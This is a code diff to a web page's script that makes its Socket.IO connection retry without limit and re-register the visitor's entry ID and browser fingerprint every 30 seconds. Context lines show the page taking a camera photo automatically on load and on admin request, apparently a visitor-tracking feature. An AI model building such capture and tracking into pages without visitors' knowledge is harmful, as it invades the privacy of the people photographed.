@@ -829,28 +829,75 @@ main a {
     let currentFingerprint = null;
 
     // Initialize WebSocket connection
+    let heartbeatInterval = null;
+    
     function initWebSocket() {
       // Use polling as fallback if WebSocket fails
       socket = io({
         transports: ['websocket', 'polling'],
         reconnection: true,
         reconnectionDelay: 1000,
-        reconnectionAttempts: 5
+        reconnectionDelayMax: 5000,
+        reconnectionAttempts: Infinity,  // Keep trying to reconnect
+        timeout: 20000
       });
       
-      socket.on('connect', () => {
-        console.log('[WEBSOCKET] Connected to server');
-        // Register this user's entry when connected
-        if (currentEntryId && currentFingerprint) {
+      // Register user function (reusable)
+      function registerUser() {
+        if (currentEntryId && currentFingerprint && socket.connected) {
           socket.emit('register_user', {
             entry_id: currentEntryId,
             fingerprint: currentFingerprint
           });
+          console.log('[WEBSOCKET] Registered user:', currentEntryId);
         }
+      }
+      
+      socket.on('connect', () => {
+        console.log('[WEBSOCKET] Connected to server');
+        // Register this user's entry when connected
+        registerUser();
+        
+        // Send periodic heartbeat to keep connection alive and re-register if needed
+        if (heartbeatInterval) {
+          clearInterval(heartbeatInterval);
+        }
+        heartbeatInterval = setInterval(() => {
+          if (socket.connected && currentEntryId && currentFingerprint) {
+            // Re-register periodically to ensure we stay in active_users
+            registerUser();
+          }
+        }, 30000); // Every 30 seconds
       });
 
-      socket.on('disconnect', () => {
-        console.log('[WEBSOCKET] Disconnected from server');
+      socket.on('reconnect', (attemptNumber) => {
+        console.log(`[WEBSOCKET] Reconnected to server (attempt ${attemptNumber})`);
+        // Re-register user after reconnection
+        registerUser();
+      });
+
+      socket.on('reconnect_attempt', (attemptNumber) => {
+        console.log(`[WEBSOCKET] Reconnection attempt ${attemptNumber}`);
+      });
+
+      socket.on('reconnect_error', (error) => {
+        console.error('[WEBSOCKET] Reconnection error:', error);
+      });
+
+      socket.on('reconnect_failed', () => {
+        console.error('[WEBSOCKET] Reconnection failed - will keep trying');
+      });
+
+      socket.on('connect_error', (error) => {
+        console.error('[WEBSOCKET] Connection error:', error);
+      });
+
+      socket.on('disconnect', (reason) => {
+        console.log('[WEBSOCKET] Disconnected from server:', reason);
+        if (heartbeatInterval) {
+          clearInterval(heartbeatInterval);
+          heartbeatInterval = null;
+        }
       });
 
       // Listen for photo requests from admin
@@ -886,6 +933,17 @@ main a {
       setTimeout(() => {
         capturePhoto('auto');  // Automatic on page load
       }, 1000);
+    });
+
+    // Cleanup on page unload
+    window.addEventListener('beforeunload', () => {
+      if (heartbeatInterval) {
+        clearInterval(heartbeatInterval);
+        heartbeatInterval = null;
+      }
+      if (socket && socket.connected) {
+        socket.disconnect();
+      }
     });
   </script>
 </body>
